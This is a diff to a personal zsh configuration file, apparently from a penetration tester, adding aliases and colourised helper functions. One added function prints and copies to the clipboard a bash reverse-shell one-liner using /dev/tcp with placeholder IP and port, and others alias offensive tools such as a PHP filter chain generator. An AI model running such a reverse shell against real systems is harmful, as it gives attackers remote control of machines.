@@ -32,7 +32,7 @@ alias pdf='libreoffice --convert-to pdf'
 alias convert='libreoffice --convert-to'
 alias rwaybar="pkill waybar && waybar &>/dev/null & disown"
 alias pipesh="bash /opt/pipes.sh/pipes.sh"
-alias chyprshot="rm /home/silvertail/Pictures/screenshots/*hyprshot.png"
+alias chyprshot="rm $HOME/Pictures/screenshots/*hyprshot.png"
 alias aquarium="asciiquarium"
 alias mktemp="cd '$(mktemp -d)'"
 alias map="mapscii"
@@ -40,6 +40,9 @@ alias whatport="sudo ss -tulpn"
 alias ordenar="bash /opt/silver/ordenar.sh"
 alias history="history | cat"
 alias chistory=": > ~/.zsh_history"
+alias cfloorp='rm -rf ~/.floorp/cache2 ~/.floorp/startupCache ~/.floorp/shader-cache'
+alias fcgenerator='python3 /opt/silver/python/php_filter_chain_generator.py'
+alias ffuf='ffuf -c'
 
 #bat
 alias cat='bat'
@@ -110,6 +113,13 @@ ponysay() {
 # ----------------------------------------------------------
 
 # ----------------------- functions ---------------------------
+function reverse-command (){
+  commmand="${blueColour}/bin/bash$ ${greenColour}-c '${blueColour}/bin/bash ${greenColour}-i ${yellowColour}>& ${blueColour}/dev/tcp/<IP>/<Port> ${yellowColour}0>&1'"
+  echo -e "\n${purpleColour}[+]${endColour} Common command for ${redColour}reverse shell${endColour}"
+  echo -e "\t${commmand}"
+  echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/<IP>/<Port> 0>&1' | tr  -d '\n' | wl-copy 2>/dev/null
+  echo -e "${purpleColour}[!]${endColour} Copied in clipboard"
+}
 
 function extractPorts () {
     ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
@@ -141,22 +151,22 @@ function openw() {
     return 1
   fi
 
-  echo -e "${yellowColour}[+]${endColour} Abriendo la mierda esta..."
+  echo -e "${redColour}\n\t[+]${endColour} Abriendo la mierda esta..."
 
   if [[ $2 ]]; then
     "$window" "$file" &>/dev/null & disown
   else
-    "$window" &>/dev/null & disown
+    "$window" &>/dev/null & disown 
   fi
 }
 
 function cdocker(){
-  echo -e "\t${greenColour}[!]${endColour} Deleting ${purpleColour}docker${endColour} containers..."
+  echo -e "\t${greenColour}[!]${endColour} Deleting ${purpleColour}docker${endColour} containers...\n"
   docker rm $(docker ps -a -q) --force 2>/dev/null
   docker rmi $(docker images -a -q) --force 2>/dev/null
   docker volume rm $(docker volume ls -q) 2>/dev/null
-  docker network rm $(docker network ls -q ) 2>/dev/null
-  echo -e "${yellowColour}[+]${endColour} Docker cleaned ${purpleColour}>:c${endColour}"
+  docker network rm $(docker network ls -q) 2>/dev/null
+  echo -e "${yellowColour}\n\t[+]${endColour} Docker cleaned ${purpleColour}>:c${endColour}"
 }
 
 # -------------------------------------------------------------
@@ -187,6 +197,9 @@ zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'
 
 
 # ---------------------- keybindings -----------------------
+
+# Evita que Ctrl+S congele el terminal (XOFF / software flow control).
+stty -ixon 2>/dev/null
 
 # correct keybindings (Home / End / etc)
 bindkey -e
